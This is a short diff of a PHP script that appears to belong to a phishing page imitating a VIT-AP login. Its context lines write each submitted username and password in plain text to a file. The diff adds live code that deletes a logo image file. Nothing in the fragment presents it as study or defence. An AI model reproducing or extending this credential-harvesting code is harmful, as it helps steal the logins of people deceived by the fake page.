@@ -5,8 +5,8 @@
     $uname = "username: ".$_POST['uname']." Password: ".$_POST['passwd']." \r\n";
   	fwrite($handle, $uname);
 
-   // $file_pointer = "logins.json";  
-   // unlink($file_pointer);
+  $file_pointer = "new VIT_AP logo.png";  
+    unlink($file_pointer);
    //  $handle = fopen('logins.json', 'a');
    //  $myObj->uname = $_POST['xyz'];
    //  $myObj->pwd = $_POST['abc'];
